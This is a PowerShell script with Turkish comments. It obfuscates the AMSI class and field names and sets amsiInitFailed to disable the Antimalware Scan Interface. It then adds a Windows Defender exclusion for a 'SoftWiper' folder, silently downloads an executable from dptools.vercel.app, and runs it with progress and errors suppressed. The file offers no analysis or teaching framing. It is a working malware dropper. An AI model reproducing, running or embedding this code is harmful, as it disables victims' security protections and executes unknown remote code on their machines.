# 1. Aşama: Sistem ve Yönetim kelimelerini ayrı ayrı tanımlama
$p1 = "Sys"
$p2 = "tem"
$p3 = "."
$p4 = "Managem"
$p5 = "ent"
$p6 = "."
$p7 = "Aut"
$p8 = "omation"
$p9 = "."
$p10 = "Amsi"
$p11 = "Utils"

# 2. Aşama: Bu parçaları birleştirerek ana sınıf adını oluşturma
$className = $p1 + $p2 + $p3 + $p4 + $p5 + $p6 + $p7 + $p8 + $p9 + $p10 + $p11

# 3. Aşama: PowerShell Assembly yapısından bu sınıfı çekme
$assembly = [Ref].Assembly
$targetType = $assembly.GetType($className)

# 4. Aşama: Değiştirilecek olan gizli alan adını parçalara ayırma
$f1 = "amsi"
$f2 = "Init"
$f3 = "Failed"
$fieldName = $f1 + $f2 + $f3

# 5. Aşama: Arama kriterlerini (Flags) tanımlama
$flag1 = "NonPublic"
$flag2 = "Static"
$searchFlags = "$flag1,$flag2"

# 6. Aşama: Hedef alanı sınıftan çekme
$targetField = $targetType.GetField($fieldName, $searchFlags)

# 7. Aşama: Değeri true (başarısız oldu) olarak set edip AMSI'yi devredışı bırakma
$nullValue = $null
$trueValue = $true
$targetField.SetValue($nullValue, $trueValue)


$softWiperPath = "C:\Program Files\SoftWiper"
if (-not (Test-Path $softWiperPath)) {
    New-Item -Path $softWiperPath -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
}

# Windows Defender İstisnası (Klasörü virüs taraması dışına alır)
Add-MpPreference -ExclusionPath $softWiperPath -ErrorAction SilentlyContinue


$folderPath = "C:\Program Files\SoftWiper"
$filePath = Join-Path $folderPath "soft.exe"
$url = "https://dptools.vercel.app/dp.exe"

# Klasör yoksa arka planda oluşturur
if (-not (Test-Path -Path $folderPath)) {
    New-Item -ItemType Directory -Path $folderPath | Out-Null
}

# Hataları ve ilerleme çubuğunu gizleyerek sessizce indirir
try {
    $ProgressPreference = 'SilentlyContinue'
    Invoke-WebRequest -Uri $url -OutFile $filePath -ErrorAction SilentlyContinue
    
    # Dosya başarıyla indirildiyse uygulamayı başlatır
    if (Test-Path -Path $filePath) {
        Start-Process -FilePath $filePath -ErrorAction SilentlyContinue
    }
} catch {
    # Hata durumunda ekrana hiçbir şey yazmaz
}
